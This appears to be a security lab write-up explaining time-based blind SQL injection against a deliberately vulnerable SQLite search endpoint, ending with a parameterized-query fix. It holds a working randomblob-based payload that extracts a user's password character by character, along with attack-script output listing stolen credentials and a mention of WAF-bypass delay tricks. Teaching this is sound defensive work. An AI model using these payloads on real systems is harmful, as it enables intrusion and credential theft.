# SQL Injection — Time-based Blind

## Overview

Time-based blind SQL injection is the most challenging injection technique for the attacker — and the hardest to defend against with superficial fixes. The application gives **no visible feedback at all**: no results, no error messages, no difference in page content. The attacker's only signal is **how long the server takes to respond**.

If a condition is TRUE, the attacker forces the database to perform a heavy computation (causing a measurable delay). If FALSE, the response comes back instantly. By comparing response times, the attacker extracts data one character at a time.

## Same Vulnerable Code

This attack uses the exact same `/search` endpoint:

```python
sql = f"SELECT ... FROM notes WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'"
```

No new endpoint needed. All three SQLi types exploit the same root cause.

## The SQLite Delay Problem

Most databases have a built-in sleep function:
- **MySQL**: `SLEEP(2)` — pause for 2 seconds
- **PostgreSQL**: `pg_sleep(2)`
- **SQL Server**: `WAITFOR DELAY '0:0:2'`

SQLite has **none of these**. So we force a delay by making it do expensive work:

```sql
CASE WHEN (condition)
  THEN length(randomblob(50000000))
  ELSE 0
END
```

`randomblob(50000000)` generates 50MB of random data in memory. `length()` forces SQLite to actually compute it. This typically takes 200–500ms — enough to distinguish from a normal ~10ms response.

## How It Works

### Step 1 — Calibrate Timing

Before attacking, the script measures three baselines:

```
Normal search (no injection):     ~12ms
TRUE  + randomblob(50M):          ~350ms   ← measurable delay
FALSE + randomblob(50M):          ~15ms    ← no delay (ELSE branch)
```

The threshold is set between the fast and slow times. Anything above the threshold counts as TRUE.

### Step 2 — Ask Timed Questions

```
"Is the first character of admin's password 'a'?"

Payload:
' AND CASE WHEN (SUBSTR((SELECT password FROM users
  WHERE username='admin'),1,1)='a')
  THEN length(randomblob(50000000)) ELSE 0 END --

Response time: 347ms  →  Above threshold  →  TRUE!
First character is 'a'.
```

```
"Is the second character 'a'?"
Response time: 11ms   →  Below threshold  →  FALSE

"Is the second character 'b'?"
Response time: 14ms   →  FALSE

...

"Is the second character 'd'?"
Response time: 382ms  →  TRUE!
Second character is 'd'.
```

Continue until the full string is extracted: `admin123`

## Three Types Compared

| Aspect | Classic | Blind | Time-based |
|--------|---------|-------|------------|
| What attacker sees | Query results on page | Result count difference | Response time only |
| Requests for 1 password | 1 | ~250 | ~250 |
| Speed | Instant | Seconds | Minutes |
| Requires visible output | Yes | Partially | No |
| Blocked by hiding results | Yes | Partially | No |
| Blocked by parameterized queries | Yes | Yes | Yes |

The key insight: **hiding results doesn't stop injection**. Only parameterized queries do.

## Calibration Details

The script's calibration phase is critical. Network jitter, server load, and disk I/O can all cause false positives. The script handles this by:

1. Taking 3 baseline measurements and averaging
2. Taking 3 delayed measurements and averaging
3. Setting threshold = max(baseline × 2.5, midpoint between fast and slow)
4. The `--delay-size` flag lets you increase the blob if the delay is too short

If your machine is fast and 50MB isn't enough delay, increase it:
```bash
python3 scripts/sqli_time.py --delay-size 100000000
```

## Example Script Output

```
PHASE 1 — Calibrate Timing
  [*]   Baseline (no delay): 14ms avg
  [*]   Delayed  (TRUE+blob): 372ms avg
  [*]   No delay (FALSE+blob): 12ms avg
  [*]   Delay ratio: 26.6x slower
  [+] Threshold set to 192ms

PHASE 3 — Extract Credentials (Time-based)
  [+] Found 2 user(s)
  [*] User 1 name: admin
  [*] User 1 pass: admin123
  [*] User 1 role: admin
  [*] User 2 name: potato
  [*] User 2 pass: test123
  [*] User 2 role: user

ATTACK SUMMARY
  Total HTTP requests:  1,847
  Time elapsed:         94.2 seconds
  Timing threshold:     192ms
```

## Real-World Relevance

Time-based blind injection is the technique of last resort — but it works against virtually any injectable query, regardless of how the application handles output. Real-world tools like **sqlmap** automatically detect and exploit all three types, falling back to time-based when nothing else works.

In production, WAFs (Web Application Firewalls) can detect the `randomblob` or `SLEEP` patterns, but attackers use alternative delay techniques (heavy JOINs, recursive queries, complex regex) to bypass these filters. The only reliable defense remains **parameterized queries**.

## Fix (Remediation)

Identical to the other two types — one fix blocks all three:

```python
# This prevents classic, blind, AND time-based injection:
sql = "SELECT * FROM notes WHERE title LIKE :q"
result = db.session.execute(text(sql), {"q": f"%{q}%"})
```

## References

- [OWASP Time-based Blind SQLi](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [PortSwigger Blind SQLi Labs](https://portswigger.net/web-security/sql-injection/blind)
- [SQLite randomblob Documentation](https://www.sqlite.org/lang_corefunc.html#randomblob)
